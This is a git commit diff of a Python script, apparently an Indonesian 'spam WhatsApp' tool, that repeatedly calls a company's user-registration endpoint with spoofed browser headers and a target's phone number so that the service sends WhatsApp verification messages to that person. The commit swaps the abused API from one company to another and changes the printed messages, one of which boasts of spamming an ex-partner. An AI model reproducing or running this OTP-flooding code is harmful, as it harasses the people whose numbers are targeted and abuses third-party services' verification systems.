85f9d0d492004dc57c98bd6bfdeba5adab75bb3d
Ximon9d <116489872+Ximon9d@users.noreply.github.com>
2022-10-24 00:38:23 +0700

    Update and rename spamwa.py to spama.py

--- spama.py
+++ spama.py
@@ -1,21 +1,21 @@
 for k in range(jumlah):
   k += 1
   head = {
-  "Host": "api.oyohotel.com",
+  "Host": "api.qoalaplus.com",
   "content-length": "48",
   "accept": "application/json, text/plain, */*",
   "user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
   "content-type": "application/json",
-  "origin": "https://www.oyohotel.com",
+  "origin": "https://www.qoalaplus.com",
   "sec-fetch-site": "same-site",
   "sec-fetch-mode": "cors",
   "sec-fetch-dest": "empty",
-  "referer": "https://www.oyohotel.com/",
+  "referer": "https://www.qoalaplus.com/",
   "accept-encoding": "gzip, deflate, br",
   "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
   data = json.dumps({"phone_number":"+62"+nomer,"channel":"WA"})
-  pos = requests.post("https://api.oyohotel.com/go-agent/v2/user/register",headers=head,data=data).text
+  pos = requests.post("https://api.qoalaplus.com/go-agent/v2/user/register",headers=head,data=data).text
   if "success" in pos:
-    print("ANJAY SPAM WhatsApp Mantan Berhasil:)",k)
+    print("😎😂😋🥱🤣😅😊🥰😋😅😎:)",k)
   else:
-    print("Makannya Ganteng Biar Gak gagal ASIK KAN YO SPAM LAGI",k)
+    print("Makan 😋😋😋I",k)
